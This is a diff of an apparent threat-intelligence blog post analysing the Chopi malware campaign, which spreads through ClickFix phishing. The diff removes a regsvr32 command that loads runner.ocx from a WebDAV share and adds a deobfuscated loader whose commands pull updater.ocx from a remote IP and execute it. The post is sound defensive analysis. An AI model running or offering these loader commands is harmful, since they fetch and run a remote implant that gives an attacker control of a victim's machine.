@@ -103,8 +103,7 @@ We've seen similar tags now between our C2 domain and screenly[.]cam. Let's do a
 
 <img src="/assets/images/posts/2026-05-21-runner-threat-intel/figure1-threatfox.png" alt="lg-debug" width="800">
 
-Check out the results! Threat researcher `Lenny_3BO` has already submitted his own findings for the `Chopi` malware campaign. Comparing his submissions against our malware sample reveals overlapping malicious domains and IPs. Very cool!
-
+Check out the results! Threat researcher `Lenny_3BO` has already submitted his own findings for the `Chopi` malware campaign. Comparing his submissions against our malware sample reveals overlapping malicious domains and IPs. 
 
 
 # Attack Chain
@@ -117,60 +116,37 @@ WebDAV is a new concept I've come to learn in my analysis. WebDAV is an HTTP ext
 
 WebDAV (Web Distributed Authoring and Versioning) extends HTTP to allow clients to read, write, and manage files on remote web servers. Legitimate use cases include SharePoint, remote file collaboration, and content management systems. Attackers love it for the same reason: it is a file transfer protocol hiding in plain sight, often permitted through firewalls that would block other staging mechanisms.
 
-## The Phish
-
-The victim is phished, usually via email. They download an attachment or follow a link within an email. That link brings them to the malicious clickfix website  (i.e, screenly[.]cam).The victim is presented with the following message on the ClickFix page:
-
-> An error occurred verifying your browser. To fix this, press Windows + R, paste the code below, and press Enter.
-
-The victim is instructed to run one of the following commands:
-
-```
-regsvr32.exe /s /n /i:"runner.ocx" \\xtrafftrck.net@80\files\runner.ocx
-```
-
-| Flag | Purpose |
-|------|---------|
-| `/s` | Silent mode, suppresses success and error dialog boxes |
-| `/n` | Do not call `DllRegisterServer`, must be used with `/i` |
-| `/i` | Passes an optional parameter string to `DllInstall` |
-
-
-
 ## The Attack
 
-Let's break down the initial attack.
+Using URLScan.io, I discovered a loader file `Screenshot_2026_04_20.lnk` available on all attacker domains. The loader link file contains obfuscated instruction code. Pivoting to Triage from within URLScan.io, I downloaded the screenshot loader and deobfuscated the code. 
 
-1. Windows WebClient (WebDAV) service mounts `\\xtrafftrck.net@80` as a virtual network share over HTTP.
-2. `regsvr32.exe` loads `runner.ocx` directly into its own process memory from the remote share.
-3. The `/n` flag tells `regsvr32.exe` to skip `DllRegisterServer` and call `DllInstall` directly.
-4. The `/i:"runner.ocx"` string is passed to `DllInstall` as `pszCmdLine`.
-5. Filename check passes. `Koki=YES Blat=YES`. `AgentThread` starts.
-5. `DllInstall` parses the string, extracts the filename via `tail`, and validates it against the expected value `runner.ocx`.
-6. The implant executes in memory and beacons to `xtrafftrck[.]net:3000`.
+```Loader
+net use \\70.34.205[.]43@8080\cloud\
+copy \\70.34.205[.]43@8080\cloud\updater.ocx %localappdata%\Packages\9892719795172581714.ocx.ocx
+start /b regsvr32 /s /i \\70.34.205[.]43@8080\cloud\updater.ocx
+start \\70.34.205[.]43@8080\cloud\Credentials.txt
+````
 
-## DllInstall Function Signature
+Let's break down the loader commands.
 
-```c
-HRESULT DllInstall(BOOL bInstall, LPCWSTR pszCmdLine);
-```
+1. Windows WebClient (WebDAV) service mounts `\\70.34.205[.]43@8080\cloud` as a virtual network share over HTTP.
+2. `Updater.ocx` is copied from the network drive to `%localappdata%\Packages\` and renamed.
+3. `regsvr32.exe` loads `updater.ocx` directly into its own process memory from the remote share.
+4. The `/b` tells windows to start application without creating a new window. 
+5. The `/i:"updater.ocx"` string is passed to `DllInstall` as `pszCmdLine`.
+6. The `/s` tells regsvr32 to run silently
 
-## DllInstall Parameters
-
-| Parameter | Type | Description |
-|-----------|------|-------------|
-| `bInstall` | `BOOL` | `TRUE` to install, `FALSE` to uninstall |
-| `pszCmdLine` | `LPCWSTR` | Optional wide string passed via `/i:` flag. `NULL` if not provided |
-
+## Analysis Gap
+It is unclear how the screenshot loader makes it to the victims desktop. It's possible the user is phished or is victim to a clickfix attack. Additionally, I'm unsure of what the Credentials.txt file contains. 
 
 ## Command and Control
 
-Now that the malware has executed, the C2 is called and the operator controls the victim's computer.
+Now that the victim has executed the malware, the C2 is called and the operator controls the victim's computer.
 
-- `AgentThread` beacons to `xtrafftrck[.]net:3000/ws/agent`
+- AgentThread starts and the C2 is contacted via port 3000
 - Operator manages the victim machine via the `Chopi Monitoring Dashboard`
 
-## Post-Exploitation
+## Post-Exploitation & Motivation
 
 In our previous post, we found the threat actors intended initial steps post-exploitation.
 
@@ -182,9 +158,9 @@ In our previous post, we found the threat actors intended initial steps post-exp
 | Discovery | Network Service Discovery | `T1046` |
 | Lateral Movement | Remote Services | `T1021` |
 
-## Motivation
+The campaign activity ranges from March to April 2026. Infrastructure domain names incorporating payment and legal services suggest deliberate targeting of financial and legal sectors. Based on the post-exploitation capabilities observed in the sample, the operator's likely objective is credential harvesting and financial gain. Further OSINT investigation reveals screenly[.]cam hosting a financial invoice request for $69,000 EUR. The overall profile is consistent with a financially motivated threat actor.
 
-The threat actor appears to operate alone, with campaign activity ranging from March to April 2026. Infrastructure domain names incorporating payment and legal services suggest deliberate targeting of financial and legal sectors. Based on the post-exploitation capabilities observed in the sample, the operator's likely objective is credential harvesting, with probable intent to monetize via dark web markets. The overall profile is consistent with a financially motivated threat actor.
+<img src="/assets/images/posts/2026-05-21-runner-threat-intel/fraud.png" alt="fraud" width="800">
 
 ## Conclusion
 
@@ -196,6 +172,8 @@ During our threat intelligence campaign, we used various web tools to bring toge
 - [VirusTotal](https://virustotal.com)
 - [Censys](https://search.censys.com)
 - [Shodan.io](https://shodan.io)
+- [Triage](https://tria.ge)
+- [URLscan](https://urlscan.io)
 
 ---
 
